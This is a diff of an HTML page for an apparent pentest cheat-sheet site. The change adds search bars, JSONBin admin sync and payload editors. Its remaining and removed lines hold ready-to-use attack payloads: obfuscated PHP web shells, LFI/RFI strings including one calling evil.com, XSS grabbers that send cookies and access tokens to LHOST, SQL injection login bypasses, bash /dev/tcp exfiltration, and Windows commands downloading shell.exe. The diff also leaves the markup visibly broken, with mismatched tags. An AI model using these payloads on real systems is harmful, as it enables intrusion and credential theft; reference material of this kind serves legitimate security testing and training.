@@ -314,6 +314,11 @@ button,input,select,textarea{font-family:var(--mono);}
 .logout-btn{margin-top:auto;margin:1rem 1rem 0;padding:6px 10px;font-size:10px;background:transparent;border:1px solid var(--border2);color:var(--muted);border-radius:4px;cursor:pointer;transition:all .14s;}
 .logout-btn:hover{color:var(--red);border-color:rgba(240,96,96,.3);}
 .api-key-note{font-size:10px;color:var(--muted);margin-top:4px;line-height:1.6;}
+.sp-search-bar{position:relative;margin-bottom:1.2rem;}
+.sp-search-bar input{width:100%;background:var(--bg2);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:12px;border-radius:7px;padding:9px 12px 9px 32px;outline:none;}
+.sp-search-bar input:focus{border-color:var(--border2);}
+.sp-search-bar::before{content:'⌕';position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:15px;pointer-events:none;}
+.sr-none{font-size:11px;color:var(--muted);padding:.5rem 0;}
 </style>
 </head>
 <body>
@@ -321,6 +326,7 @@ button,input,select,textarea{font-family:var(--mono);}
 <!-- NAV -->
 <nav id="nav">
   <div class="n-brand" onclick="go('home')">nufyl<em>.</em></div>
+  <span id="sync-dot" title="config sync status" style="width:6px;height:6px;border-radius:50%;background:var(--border3);display:inline-block;flex-shrink:0;margin-right:4px;transition:background .3s;cursor:default;"></span>
   <div id="nav-links" style="display:flex;gap:2px;align-items:center;overflow-x:auto;">
     <button class="n-link" onclick="go('shells')" data-p="shells"><span class="ni" id="ni-shells"></span> shells</button>
     <button class="n-link" onclick="go('payloads')" data-p="payloads"><span class="ni" id="ni-payloads"></span> payloads</button>
@@ -481,15 +487,12 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div class="sec">
         <div class="sec-hdr"><span class="sec-icon">🕵️</span><span class="sec-lbl">obfuscated web shells</span></div>
-        <div class="cmd-list">
-          <div class="cmd-item"><div class="cmd-lbl">short GET</div><div class="cmd-val">&lt;?=`$_GET[0]`?&gt;</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">short POST</div><div class="cmd-val">&lt;?=`$_POST[0]`?&gt;</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">request var</div><div class="cmd-val">&lt;?=`{$_REQUEST['_']}`?&gt;</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">full obfuscated (GET ?0=cmd)</div><div class="cmd-val">&lt;?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?&gt;</div></div>
-          <div class="cmd-item"><div class="cmd-lbl">function/arg style (?_=system&amp;__=id)</div><div class="cmd-val">&lt;?php $_="{"; $_=($_^"&lt;").($_^"&gt;;").($_^"/"); ?&gt;&lt;?=${'_'.$_}['_'](${'_'.$_}['__']);?&gt;</div></div>
-        </div>
+        <div class="sp-search-bar"><input type="text" id="php-search" placeholder="search php shells..." oninput="renderCmdPage(\'php\')"></div>
+        <div class="cmd-list" id="php-cmd-list"></div>
       </div>
     </div>
+  </div>
+</div>
   </div>
 </div>
 
@@ -502,6 +505,7 @@ button,input,select,textarea{font-family:var(--mono);}
       <p class="sp-desc" id="lfi-desc">Local file inclusion payloads, PHP wrappers, and useful target files for Linux/Windows/Apache/MySQL.</p>
     </div>
     <div class="sp-body">
+      <div class="sp-search-bar"><input type="text" id="lfi-search" placeholder="search lfi payloads..." oninput="renderCmdPage('lfi')"></div>
       <div class="tab-nav">
         <button class="tb on" onclick="switchTab(this,'lfi-tabs','lfi-basic')">traversal</button>
         <button class="tb" onclick="switchTab(this,'lfi-tabs','lfi-wrappers')">php wrappers</button>
@@ -511,9 +515,8 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div id="lfi-tabs">
         <div id="lfi-basic" class="tpane on">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">classic traversal</div><div class="cmd-val">../../../../../../../../etc/passwd</div></div>
-            <div class="cmd-item"><div class="cmd-lbl">null byte bypass (PHP &lt;5.3)</div><div class="cmd-val">../../../../etc/passwd%00</div></div>
+          <div class="cmd-list" id="lfi-cmd-basic"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">double encoding</div><div class="cmd-val">..%252f..%252f..%252fetc%252fpasswd</div></div>
             <div class="cmd-item"><div class="cmd-lbl">unicode / overlong UTF-8</div><div class="cmd-val">..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</div></div>
             <div class="cmd-item"><div class="cmd-lbl">path truncation (PHP &lt;5.3)</div><div class="cmd-val">../../../../etc/passwd..........</div></div>
@@ -521,8 +524,8 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="lfi-wrappers" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">base64 encode file</div><div class="cmd-val">?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd</div></div>
+          <div class="cmd-list" id="lfi-cmd-wrappers"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">expect RCE</div><div class="cmd-val">?page=expect://ls</div></div>
             <div class="cmd-item"><div class="cmd-lbl">remote file (RFI)</div><div class="cmd-val">?page=http://evil.com/shell.txt</div></div>
             <div class="cmd-item"><div class="cmd-lbl">input stream RCE (POST body = php)</div><div class="cmd-val">?page=php://input</div></div>
@@ -552,6 +555,7 @@ button,input,select,textarea{font-family:var(--mono);}
       <p class="sp-desc" id="xss-desc">XSS payloads for HTML, SVG, Markdown contexts plus data grabbers and blacklist bypasses.</p>
     </div>
     <div class="sp-body">
+      <div class="sp-search-bar"><input type="text" id="xss-search" placeholder="search xss payloads..." oninput="renderCmdPage('xss')"></div>
       <div class="tab-nav">
         <button class="tb on" onclick="switchTab(this,'xss-tabs','xss-grab')">data grabbers</button>
         <button class="tb" onclick="switchTab(this,'xss-tabs','xss-html')">html/app</button>
@@ -561,8 +565,8 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div id="xss-tabs">
         <div id="xss-grab" class="tpane on">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">cookie grab via redirect</div><div class="cmd-val">&lt;script&gt;document.location='http://LHOST/grab.php?c='+document.cookie&lt;/script&gt;</div></div>
+          <div class="cmd-list" id="xss-cmd-grab"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">localStorage access_token</div><div class="cmd-val">&lt;script&gt;document.location='http://LHOST/grab.php?c='+localStorage.getItem('access_token')&lt;/script&gt;</div></div>
             <div class="cmd-item"><div class="cmd-lbl">image beacon (cookie)</div><div class="cmd-val">&lt;script&gt;new Image().src='http://LHOST/c.php?c='+document.cookie;&lt;/script&gt;</div></div>
             <div class="cmd-item"><div class="cmd-lbl">fetch exfil (base64)</div><div class="cmd-val">&lt;script&gt;fetch('http://LHOST/?c='+btoa(document.cookie))&lt;/script&gt;</div></div>
@@ -570,8 +574,8 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="xss-html" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">basic alert</div><div class="cmd-val">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></div>
+          <div class="cmd-list" id="xss-cmd-html"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">script tag bypass (filter evasion)</div><div class="cmd-val">&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;</div></div>
             <div class="cmd-item"><div class="cmd-lbl">attribute breakout</div><div class="cmd-val">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></div>
             <div class="cmd-item"><div class="cmd-lbl">img onerror</div><div class="cmd-val">&lt;img src=x onerror=alert(1)&gt;</div></div>
@@ -582,24 +586,24 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="xss-md" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">markdown link (javascript:)</div><div class="cmd-val">[clickme](javascript:prompt(document.cookie))</div></div>
+          <div class="cmd-list" id="xss-cmd-md"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">space obfuscation</div><div class="cmd-val">[a](j a v a s c r i p t:prompt(document.cookie))</div></div>
             <div class="cmd-item"><div class="cmd-lbl">data URI base64</div><div class="cmd-val">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</div></div>
             <div class="cmd-item"><div class="cmd-lbl">window.onerror</div><div class="cmd-val">[a](javascript:window.onerror=alert;throw%201)</div></div>
           </div>
         </div>
         <div id="xss-svg" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">svg onload</div><div class="cmd-val">&lt;svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/&gt;</div></div>
+          <div class="cmd-list" id="xss-cmd-svg"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">svg desc CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
             <div class="cmd-item"><div class="cmd-lbl">svg foreignObject CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
             <div class="cmd-item"><div class="cmd-lbl">svg title CDATA</div><div class="cmd-val">&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;</div></div>
           </div>
         </div>
         <div id="xss-bypass" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">eval string concat</div><div class="cmd-val">eval('ale'+'rt(1)')</div></div>
+          <div class="cmd-list" id="xss-cmd-bypass"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">Function constructor</div><div class="cmd-val">Function('ale'+'rt(1)')()</div></div>
             <div class="cmd-item"><div class="cmd-lbl">setTimeout string</div><div class="cmd-val">setTimeout('ale'+'rt(2)')</div></div>
             <div class="cmd-item"><div class="cmd-lbl">Set.constructor template</div><div class="cmd-val">Set.constructor`alert(1)```</div></div>
@@ -621,6 +625,7 @@ button,input,select,textarea{font-family:var(--mono);}
       <p class="sp-desc" id="sqli-desc">UNION, error-based, blind/time-based, and auth bypass payloads for MySQL, MSSQL, Oracle, PostgreSQL.</p>
     </div>
     <div class="sp-body">
+      <div class="sp-search-bar"><input type="text" id="sqli-search" placeholder="search sqli payloads..." oninput="renderCmdPage('sqli')"></div>
       <div class="tab-nav">
         <button class="tb on" onclick="switchTab(this,'sqli-tabs','sqli-union')">union/enum</button>
         <button class="tb" onclick="switchTab(this,'sqli-tabs','sqli-blind')">blind/time</button>
@@ -629,8 +634,8 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div id="sqli-tabs">
         <div id="sqli-union" class="tpane on">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">null probe (MySQL/MSSQL/PG)</div><div class="cmd-val">' UNION SELECT NULL,NULL,NULL-- -</div></div>
+          <div class="cmd-list" id="sqli-cmd-union"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">null probe (Oracle)</div><div class="cmd-val">' UNION SELECT NULL,NULL,NULL FROM DUAL-- -</div></div>
             <div class="cmd-item"><div class="cmd-lbl">column count (ORDER BY)</div><div class="cmd-val">' ORDER BY 1-- -</div></div>
             <div class="cmd-item"><div class="cmd-lbl">version (MySQL/MSSQL)</div><div class="cmd-val">' UNION SELECT @@version-- -</div></div>
@@ -645,8 +650,8 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="sqli-blind" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">time-based (MySQL)</div><div class="cmd-val">,(SELECT * FROM (SELECT(SLEEP(5)))a)</div></div>
+          <div class="cmd-list" id="sqli-cmd-blind"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">time-based (MSSQL)</div><div class="cmd-val">'; WAITFOR DELAY '0:0:5'--</div></div>
             <div class="cmd-item"><div class="cmd-lbl">conditional error (MySQL)</div><div class="cmd-val">' UNION SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')-- -</div></div>
             <div class="cmd-item"><div class="cmd-lbl">conditional error (Postgres)</div><div class="cmd-val">' UNION SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END-- -</div></div>
@@ -656,8 +661,8 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="sqli-auth" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">or true</div><div class="cmd-val">or true--</div></div>
+          <div class="cmd-list" id="sqli-cmd-auth"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">double-quote close</div><div class="cmd-val">") or true--</div></div>
             <div class="cmd-item"><div class="cmd-lbl">single-quote close</div><div class="cmd-val">') or true--</div></div>
             <div class="cmd-item"><div class="cmd-lbl">admin bypass (--)</div><div class="cmd-val">admin') or ('1'='1'--</div></div>
@@ -667,8 +672,8 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="sqli-order" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 1</div><div class="cmd-val">1' ORDER BY 1--+</div></div>
+          <div class="cmd-list" id="sqli-cmd-order"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 2</div><div class="cmd-val">1' ORDER BY 2--+</div></div>
             <div class="cmd-item"><div class="cmd-lbl">ORDER BY column count 3</div><div class="cmd-val">1' ORDER BY 3--+</div></div>
             <div class="cmd-item"><div class="cmd-lbl">GROUP BY 1,2,3</div><div class="cmd-val">1' GROUP BY 1,2,3--+</div></div>
@@ -692,6 +697,7 @@ button,input,select,textarea{font-family:var(--mono);}
       <p class="sp-desc" id="linux-desc">Post-exploitation Linux enumeration, SUID, cron, network, privesc, and file transfer commands.</p>
     </div>
     <div class="sp-body">
+      <div class="sp-search-bar"><input type="text" id="linux-search" placeholder="search linux commands..." oninput="renderCmdPage('linux')"></div>
       <div class="tab-nav">
         <button class="tb on" onclick="switchTab(this,'linux-tabs','linux-suid')">suid/caps</button>
         <button class="tb" onclick="switchTab(this,'linux-tabs','linux-sysinfo')">sysinfo</button>
@@ -702,8 +708,8 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div id="linux-tabs">
         <div id="linux-suid" class="tpane on">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">find SUID root files</div><div class="cmd-val">find / -user root -perm /4000 2>/dev/null</div></div>
+          <div class="cmd-list" id="linux-cmd-suid"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">find SUID (alt)</div><div class="cmd-val">find / -perm -u=s -type f 2>/dev/null</div></div>
             <div class="cmd-item"><div class="cmd-lbl">find SUID list</div><div class="cmd-val">find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/suid</div></div>
             <div class="cmd-item"><div class="cmd-lbl">capabilities</div><div class="cmd-val">getcap -r / 2>/dev/null</div></div>
@@ -715,16 +721,16 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="linux-sysinfo" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">OS release</div><div class="cmd-val">cat /etc/issue; cat /etc/*-release</div></div>
+          <div class="cmd-list" id="linux-cmd-sysinfo"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">kernel version</div><div class="cmd-val">uname -a; cat /proc/version</div></div>
             <div class="cmd-item"><div class="cmd-lbl">env variables</div><div class="cmd-val">cat /etc/profile; cat ~/.bashrc; env</div></div>
             <div class="cmd-item"><div class="cmd-lbl">service configs</div><div class="cmd-val">cat /etc/apache2/apache2.conf; cat /etc/my.conf</div></div>
           </div>
         </div>
         <div id="linux-cron" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">list user crontab</div><div class="cmd-val">crontab -l</div></div>
+          <div class="cmd-list" id="linux-cmd-cron"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">list cron spool</div><div class="cmd-val">ls -alh /var/spool/cron</div></div>
             <div class="cmd-item"><div class="cmd-lbl">all cron files</div><div class="cmd-val">ls -al /etc/cron*; cat /etc/crontab; cat /etc/anacrontab</div></div>
             <div class="cmd-item"><div class="cmd-lbl">root crontab</div><div class="cmd-val">cat /var/spool/cron/crontabs/root</div></div>
@@ -732,24 +738,24 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="linux-net" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">open connections</div><div class="cmd-val">lsof -i; netstat -antup; netstat -tulpn</div></div>
+          <div class="cmd-list" id="linux-cmd-net"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">port 80 check</div><div class="cmd-val">lsof -i :80; grep 80 /etc/services</div></div>
             <div class="cmd-item"><div class="cmd-lbl">login history</div><div class="cmd-val">last; lastlog</div></div>
             <div class="cmd-item"><div class="cmd-lbl">running services</div><div class="cmd-val">chkconfig --list; chkconfig --list | grep 3:on</div></div>
           </div>
         </div>
         <div id="linux-portfwd" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">SSH local port forward</div><div class="cmd-val">ssh -L 8080:127.0.0.1:80 root@192.168.1.7</div></div>
+          <div class="cmd-list" id="linux-cmd-portfwd"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">SSH remote port forward</div><div class="cmd-val">ssh -R 8080:127.0.0.1:80 root@192.168.1.7</div></div>
             <div class="cmd-item"><div class="cmd-lbl">nc port relay</div><div class="cmd-val">mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe</div></div>
             <div class="cmd-item"><div class="cmd-lbl">nc proxy (port 80→8080)</div><div class="cmd-val">mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe</div></div>
           </div>
         </div>
         <div id="linux-filetransfer" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">python3 HTTP server</div><div class="cmd-val">python3 -m http.server 8080</div></div>
+          <div class="cmd-list" id="linux-cmd-filetransfer"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">python2 HTTP server</div><div class="cmd-val">python -m SimpleHTTPServer 8080</div></div>
             <div class="cmd-item"><div class="cmd-lbl">bash upload over HTTP</div><div class="cmd-val">bash -c 'echo -e "POST / HTTP/0.9\n$(cat file)" > /dev/tcp/LHOST/PORT'</div></div>
             <div class="cmd-item"><div class="cmd-lbl">bash TCP exfil (receiver)</div><div class="cmd-val">nc -l -p 54 > data</div></div>
@@ -774,6 +780,7 @@ button,input,select,textarea{font-family:var(--mono);}
       <p class="sp-desc" id="windows-desc">PowerShell enumeration, Active Directory recon via PowerView, and AD LDAP scripts.</p>
     </div>
     <div class="sp-body">
+      <div class="sp-search-bar"><input type="text" id="windows-search" placeholder="search windows commands..." oninput="renderCmdPage('windows')"></div>
       <div class="tab-nav">
         <button class="tb on" onclick="switchTab(this,'win-tabs','win-sysinfo')">sysinfo</button>
         <button class="tb" onclick="switchTab(this,'win-tabs','win-http')">http/download</button>
@@ -782,8 +789,8 @@ button,input,select,textarea{font-family:var(--mono);}
       </div>
       <div id="win-tabs">
         <div id="win-sysinfo" class="tpane on">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">system info</div><div class="cmd-val">systeminfo; Get-WmiObject Win32_ComputerSystem</div></div>
+          <div class="cmd-list" id="win-cmd-sysinfo"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">hostname + domain</div><div class="cmd-val">echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"</div></div>
             <div class="cmd-item"><div class="cmd-lbl">security patches</div><div class="cmd-val">Get-Hotfix -description "Security update"</div></div>
             <div class="cmd-item"><div class="cmd-lbl">hotfix (wmic)</div><div class="cmd-val">wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn</div></div>
@@ -793,16 +800,16 @@ button,input,select,textarea{font-family:var(--mono);}
           </div>
         </div>
         <div id="win-http" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">wget equiv (PowerShell)</div><div class="cmd-val">Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe"</div></div>
+          <div class="cmd-list" id="win-cmd-http"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">certutil download</div><div class="cmd-val">certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe</div></div>
             <div class="cmd-item"><div class="cmd-lbl">bitsadmin download</div><div class="cmd-val">bitsadmin /transfer job /download /priority high http://10.10.10.10/file C:\file</div></div>
             <div class="cmd-item"><div class="cmd-lbl">PS Net.WebClient</div><div class="cmd-val">(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file','C:\file')</div></div>
           </div>
         </div>
         <div id="win-ad" class="tpane">
-          <div class="cmd-list">
-            <div class="cmd-item"><div class="cmd-lbl">PowerView URL</div><div class="cmd-val">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</div></div>
+          <div class="cmd-list" id="win-cmd-ad"></div>
+        </div>
             <div class="cmd-item"><div class="cmd-lbl">domain enum</div><div class="cmd-val">Get-NetDomain; Get-NetForestDomain; Get-DomainSID</div></div>
             <div class="cmd-item"><div class="cmd-lbl">domain policy</div><div class="cmd-val">Get-DomainPolicy</div></div>
             <div class="cmd-item"><div class="cmd-lbl">OUs</div><div class="cmd-val">Get-NetOU</div></div>
@@ -1128,8 +1135,8 @@ $Searcher.FindAll() | Foreach {
       </div>
       <div class="sec">
         <div class="sec-hdr"><span class="sec-icon">⚡</span><span class="sec-lbl">quick spawn methods</span></div>
-        <div class="cmd-list">
-          <div class="cmd-item"><div class="cmd-lbl">python2</div><div class="cmd-val">python -c 'import pty; pty.spawn("/bin/bash")'</div></div>
+        <div class="sp-search-bar" style="margin-top:.5rem;"><input type="text" id="tty-search" placeholder="search spawn methods..." oninput="renderCmdPage('tty')"></div>
+        <div class="cmd-list" id="tty-cmd-list"></div><div class="cmd-val">python -c 'import pty; pty.spawn("/bin/bash")'</div></div>
           <div class="cmd-item"><div class="cmd-lbl">os.system</div><div class="cmd-val">echo os.system('/bin/bash')</div></div>
           <div class="cmd-item"><div class="cmd-lbl">bash -i</div><div class="cmd-val">/bin/sh -i</div></div>
           <div class="cmd-item"><div class="cmd-lbl">perl</div><div class="cmd-val">perl -e 'exec "/bin/sh";'</div></div>
@@ -1183,6 +1190,21 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>site tagline</label><textarea id="adm-home-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="saveField('home-desc','adm-home-desc','adm-home')">save</button>
           <span class="sv-flash" id="sv-adm-home">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div class="adm-ttl">jsonbin sync</div>
+          <p style="font-size:11px;color:var(--muted);margin-bottom:1rem;line-height:1.8;">Connect a <a href="https://jsonbin.io" target="_blank" style="color:var(--blue);">JSONBin.io</a> bin so all admin changes sync across every browser instantly. <br>1. Create a free account at jsonbin.io &nbsp;2. Create a new bin &nbsp;3. Paste your API key and Bin ID below.</p>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;">
+            <div class="ef" style="margin:0;"><label>API key (X-Master-Key)</label><input type="password" id="jb-apikey" placeholder="$2b$10$..."></div>
+            <div class="ef" style="margin:0;"><label>Bin ID</label><input type="text" id="jb-binid" placeholder="64abc123..."></div>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+            <button class="sv-btn" onclick="saveJbCredentials()">save credentials</button>
+            <button class="sv-btn" style="background:var(--bg3);border:1px solid var(--border2);color:var(--muted);" onclick="testJbConnection()">test connection</button>
+            <button class="sv-btn" style="background:var(--bg3);border:1px solid var(--border2);color:var(--muted);" onclick="pushToJb()">push all to bin now</button>
+            <button class="sv-btn" style="background:var(--bg3);border:1px solid var(--border2);color:var(--muted);" onclick="pullFromJb()">pull from bin now</button>
+            <button class="sv-btn" style="background:transparent;border:1px solid rgba(240,96,96,.3);color:var(--red);" onclick="clearJbCredentials()">clear credentials</button>
+          </div>
+          <div id="jb-status" style="font-size:11px;margin-top:10px;color:var(--muted);line-height:1.7;"></div>
         </div>
         <!-- SHELLS -->
         <div id="adm-shells" class="adm-s">
@@ -1211,6 +1233,12 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>page title</label><input type="text" id="adm-php-title"></div>
           <div class="ef"><label>description</label><textarea id="adm-php-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="savePageMeta('php','adm-php')">save</button><span class="sv-flash" id="sv-adm-php">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">obfuscated web shells</div>
+          <div class="ple-list" id="php-ple-list"></div>
+          <button class="add-btn" onclick="addCmdItem('php')">+ add entry</button>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="saveCmdPage('php')">save all</button>
+          <span class="sv-flash" id="sv-php-items">saved</span>
         </div>
         <!-- LFI -->
         <div id="adm-lfi" class="adm-s">
@@ -1218,6 +1246,28 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>page title</label><input type="text" id="adm-lfi-title"></div>
           <div class="ef"><label>description</label><textarea id="adm-lfi-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="savePageMeta('lfi','adm-lfi')">save</button><span class="sv-flash" id="sv-adm-lfi">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">traversal payloads</div>
+          <div class="ple-list" id="lfi-ple-basic"></div>
+          <button class="add-btn" onclick="addCmdItemTab('lfi','basic')">+ add to traversal</button>
+          <hr style="border-color:var(--border);margin:1rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">php wrappers</div>
+          <div class="ple-list" id="lfi-ple-wrappers"></div>
+          <button class="add-btn" onclick="addCmdItemTab('lfi','wrappers')">+ add to wrappers</button>
+          <hr style="border-color:var(--border);margin:1rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">linux target files</div>
+          <div class="ple-list" id="lfi-ple-linux"></div>
+          <button class="add-btn" onclick="addCmdItemTab('lfi','linux')">+ add to linux files</button>
+          <hr style="border-color:var(--border);margin:1rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">windows target files</div>
+          <div class="ple-list" id="lfi-ple-windows"></div>
+          <button class="add-btn" onclick="addCmdItemTab('lfi','windows')">+ add to windows files</button>
+          <hr style="border-color:var(--border);margin:1rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">apache/mysql files</div>
+          <div class="ple-list" id="lfi-ple-apache"></div>
+          <button class="add-btn" onclick="addCmdItemTab('lfi','apache')">+ add to apache/mysql</button>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="saveCmdPageTabs('lfi')">save all lfi items</button>
+          <span class="sv-flash" id="sv-lfi-items">saved</span>
         </div>
         <!-- XSS -->
         <div id="adm-xss" class="adm-s">
@@ -1225,6 +1275,16 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>page title</label><input type="text" id="adm-xss-title"></div>
           <div class="ef"><label>description</label><textarea id="adm-xss-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="savePageMeta('xss','adm-xss')">save</button><span class="sv-flash" id="sv-adm-xss">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;">
+            <div><div class="adm-ttl" style="font-size:13px;">data grabbers</div><div class="ple-list" id="xss-ple-grab"></div><button class="add-btn" onclick="addCmdItemTab('xss','grab')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">html/app</div><div class="ple-list" id="xss-ple-html"></div><button class="add-btn" onclick="addCmdItemTab('xss','html')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">markdown</div><div class="ple-list" id="xss-ple-md"></div><button class="add-btn" onclick="addCmdItemTab('xss','md')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">svg</div><div class="ple-list" id="xss-ple-svg"></div><button class="add-btn" onclick="addCmdItemTab('xss','svg')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">bypasses</div><div class="ple-list" id="xss-ple-bypass"></div><button class="add-btn" onclick="addCmdItemTab('xss','bypass')">+ add</button></div>
+          </div>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="saveCmdPageTabs('xss')">save all xss items</button>
+          <span class="sv-flash" id="sv-xss-items">saved</span>
         </div>
         <!-- SQLI -->
         <div id="adm-sqli" class="adm-s">
@@ -1232,6 +1292,15 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>page title</label><input type="text" id="adm-sqli-title"></div>
           <div class="ef"><label>description</label><textarea id="adm-sqli-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="savePageMeta('sqli','adm-sqli')">save</button><span class="sv-flash" id="sv-adm-sqli">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;">
